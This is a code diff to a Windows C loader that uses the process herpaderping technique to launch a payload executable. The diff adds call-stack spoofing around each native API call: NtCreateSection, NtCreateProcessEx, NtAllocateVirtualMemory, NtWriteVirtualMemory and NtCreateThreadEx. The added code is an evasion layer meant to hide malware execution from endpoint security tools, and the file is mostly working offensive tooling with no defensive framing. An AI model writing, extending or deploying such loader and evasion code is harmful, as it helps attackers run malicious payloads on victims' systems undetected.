@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "CWLInc.h"
+#include "StackSpoof.h"
 
 // Default payload path - can be overridden at compile time
 // Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""
@@ -159,9 +160,15 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	wprintf(L"[+] Payload written into the temp file...\n");
 
-	// CreateSection with temp file
+	// CreateSection with temp file (SPOOFED CALL)
 	// SEC_IMAGE flag is set
-	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
+	wprintf(L"[*] Calling NtCreateSection with spoofed stack...\n");
+	{
+		StackSpoofer spoofer("kernel32.dll");
+		spoofer.Activate();
+		status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
+		spoofer.Deactivate();
+	}
 	if (!NT_SUCCESS(status))
 	{
 		perror("[-] Unable to create section from temp file...\n");
@@ -169,9 +176,15 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	wprintf(L"[+] Section created from the temp file...\n");
 
-	// Create Process with section
-	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
-								PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+	// Create Process with section (SPOOFED CALL)
+	wprintf(L"[*] Calling NtCreateProcessEx with spoofed stack...\n");
+	{
+		StackSpoofer spoofer("kernel32.dll");
+		spoofer.Activate();
+		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
+									PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+		spoofer.Deactivate();
+	}
 	if (!NT_SUCCESS(status))
 	{
 		perror("[-] Unable to create process... \n");
@@ -219,15 +232,27 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 
 	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
 	PVOID paramBuffer = processParameters;
-	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
-									  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	wprintf(L"[*] Calling NtAllocateVirtualMemory with spoofed stack...\n");
+	{
+		StackSpoofer spoofer("kernel32.dll");
+		spoofer.Activate();
+		status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
+										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		spoofer.Deactivate();
+	}
 	if (!NT_SUCCESS(status))
 	{
 		perror("Unable to allocate memory for process parameters.. \n");
 		exit(-1);
 	}
-	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
-								   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
+	wprintf(L"[*] Calling NtWriteVirtualMemory with spoofed stack...\n");
+	{
+		StackSpoofer spoofer("kernel32.dll");
+		spoofer.Activate();
+		status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
+									   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
+		spoofer.Deactivate();
+	}
 	if (!NT_SUCCESS(status))
 	{
 		perror("Failed to write process parameters in target process.. \n");
@@ -242,9 +267,15 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	wprintf(L"[+] Process parameters all set...\n");
 
-	// Create and resume thread
-	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
-							   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
+	// Create and resume thread (SPOOFED CALL)
+	wprintf(L"[*] Calling NtCreateThreadEx with spoofed stack...\n");
+	{
+		StackSpoofer spoofer("kernel32.dll");
+		spoofer.Activate();
+		status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
+								   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
+		spoofer.Deactivate();
+	}
 	wprintf(L"[+] Thread executed...\n");
 	if (!NT_SUCCESS(status))
 	{
